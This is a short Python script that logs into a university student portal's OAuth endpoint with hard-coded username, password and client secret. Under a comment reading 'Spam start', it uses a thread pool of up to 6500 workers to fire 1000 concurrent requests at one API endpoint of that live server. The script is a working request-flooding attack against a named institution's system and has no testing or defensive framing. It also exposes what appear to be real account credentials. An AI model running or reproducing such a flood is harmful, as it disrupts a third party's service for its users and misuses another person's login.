import requests
from concurrent.futures import ThreadPoolExecutor

urlLogin = "https://sinhvien1.tlu.edu.vn:8098/education/oauth/token"

dataRequestLogin = {
    "client_id": "education_client",
    "grant_type": "password",
    "username": "2151123458",
    "password": "036203016464",
    "client_secret": "password"
}

response = requests.post(urlLogin, data=dataRequestLogin)

access_token = response.json().get("access_token")
print(f"Access Token: {access_token}")

# Spam start
url = "https://sinhvien1.tlu.edu.vn:8098/education/api/semester/1/100"
headers = {
    "Authorization": "Bearer " + access_token
}

# Function to make a single request
def make_request(_):
    print("aaa")
    requests.get(url, headers=headers)

# Number of parallel requests
num_requests = 1000

# Set max_workers to a higher value
max_workers = 6500

# Use ThreadPoolExecutor to make asynchronous requests
with ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Use submit instead of map to fire off asynchronous requests
    futures = [executor.submit(make_request, _) for _ in range(num_requests)]

# Wait for all threads to complete (optional)
for future in futures:
    future.result()

print("All requests submitted")